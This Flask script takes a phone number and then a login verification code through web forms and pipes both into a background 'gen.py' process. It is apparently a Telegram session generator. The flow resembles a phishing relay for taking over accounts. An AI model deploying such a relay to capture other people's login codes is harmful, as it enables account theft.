from flask import Flask, render_template, request, redirect, url_for
import subprocess
import time
import argparse
import logging

app = Flask(__name__)
api_id = ''
api_hash = ''

phone_number = None
code = None
process = None


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/submit', methods=['POST'])
def submit():
    global phone_number, process
    phone_number = request.form['phone']
    process = subprocess.Popen(['python', 'gen.py'], stdin=subprocess.PIPE, text=True)
    time.sleep(5)
    process.stdin.write(phone_number + '\n')
    process.stdin.flush()
    return render_template('verify.html')


@app.route('/verify', methods=['POST'])
def verify():
    global code, process
    code = request.form['code']
    time.sleep(7)
    if process is not None:
        process.stdin.write(code + '\n')
        process.stdin.flush()
        process.stdin.close()
        process.wait()
    return "Verification complete"


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Server preference')
    parser.add_argument('-u', type=str, help='Host handler')
    parser.add_argument('-p', type=int, help='Port handler')
    args = parser.parse_args()

    host = args.u
    port = args.p

    app.run(host=host, port=port, debug=False)
